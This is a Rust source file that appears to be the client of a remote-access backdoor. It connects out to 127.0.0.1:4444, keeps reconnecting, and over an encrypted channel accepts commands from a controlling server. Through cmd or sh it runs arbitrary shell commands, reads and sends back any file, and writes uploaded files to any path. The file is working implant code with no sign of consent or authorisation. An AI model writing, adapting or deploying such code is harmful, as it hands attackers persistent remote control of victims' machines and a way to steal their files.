mod shared;

use std::error::Error;
use std::fs;
use std::io::Read;
use std::net::TcpStream;
use std::process::Command as SysCommand;
use std::thread;
use std::time::Duration;
use shared::*;

fn main() -> Result<(), Box<dyn Error>> {
    let server_addr = "127.0.0.1:4444";
    
    loop {
        match connect_to_server(server_addr) {
            Ok(_) => println!("Disconnected from server, reconnecting in 30 seconds..."),
            Err(e) => println!("Connection error: {}, reconnecting in 30 seconds...", e),
        }
        
        thread::sleep(Duration::from_secs(30));
    }
}

fn connect_to_server(server_addr: &str) -> Result<(), Box<dyn Error>> {
    let stream = TcpStream::connect(server_addr)?;
    println!("Connected to server at {}", server_addr);
    
    let mut crypto = CryptoChannel::new(stream);
    crypto.perform_key_exchange(false)?;
    println!("Key exchange completed");
    
    loop {
        let command = crypto.receive_command()?;
        
        match command {
            Command::Heartbeat => {
                crypto.send_response(&Response::HeartbeatResponse)?;
            },
            Command::ExecuteCommand { command } => {
                let output = execute_system_command(&command)?;
                crypto.send_response(&Response::CommandOutput { output })?;
            },
            Command::ReadFile { path } => {
                match read_file(&path) {
                    Ok(content) => {
                        crypto.send_response(&Response::FileContent { content })?;
                    },
                    Err(e) => {
                        crypto.send_response(&Response::Error { 
                            message: format!("Failed to read file: {}", e) 
                        })?;
                    }
                }
            },
            Command::UploadFile { path, content } => {
                match fs::write(&path, content) {
                    Ok(_) => {
                        crypto.send_response(&Response::UploadResponse { 
                            success: true, 
                            message: format!("File uploaded to {}", path) 
                        })?;
                    },
                    Err(e) => {
                        crypto.send_response(&Response::UploadResponse { 
                            success: false, 
                            message: format!("Failed to write file: {}", e) 
                        })?;
                    }
                }
            },
            Command::Disconnect => {
                return Ok(());
            }
        }
    }
}

fn execute_system_command(cmd: &str) -> Result<String, Box<dyn Error>> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.is_empty() {
        return Ok("Empty command".to_string());
    }
    
    let output = if cfg!(target_os = "windows") {
        SysCommand::new("cmd")
                .args(&["/C", cmd])
                .output()?
    } else {
        SysCommand::new("sh")
                .args(&["-c", cmd])
                .output()?
    };
    
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    
    if !stderr.is_empty() {
        Ok(format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr))
    } else {
        Ok(stdout)
    }
}

fn read_file(path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut file = fs::File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer)
}
